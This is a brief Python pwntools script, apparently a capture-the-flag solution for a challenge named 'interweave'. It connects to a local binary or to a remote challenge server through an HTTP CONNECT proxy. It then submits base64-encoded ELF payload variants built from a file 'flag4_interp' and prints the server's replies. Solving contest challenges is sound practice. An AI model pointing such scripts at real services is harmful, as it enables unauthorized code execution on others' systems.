import base64
from pwn import *


def do_interp(cred):
    try:
        if cred is None:
            proc = process('./interweave')
        else:
            proc = remote('101.132.105.41.nip.io',22022)
            proc.send(b'CONNECT ' + cred + b' HTTP/1.1\r\n\r\n')
            proc.recvline()
            proc.recvline()
            proc.recvline()

        blobs = [base64.b64decode(proc.recvline()) for i in range(16)]

        code = open('flag4_interp', 'rb').read()
        elfs = [code + bytes([i]) for i in range(16)]

        for b in elfs:
            proc.send(base64.b64encode(b).replace(b'=', b'') + b'\n')

        while True:
            print(proc.recvline())
    except EOFError:
        pass
    proc.close()


if __name__ == '__main__':
    while True:
        do_interp(None)
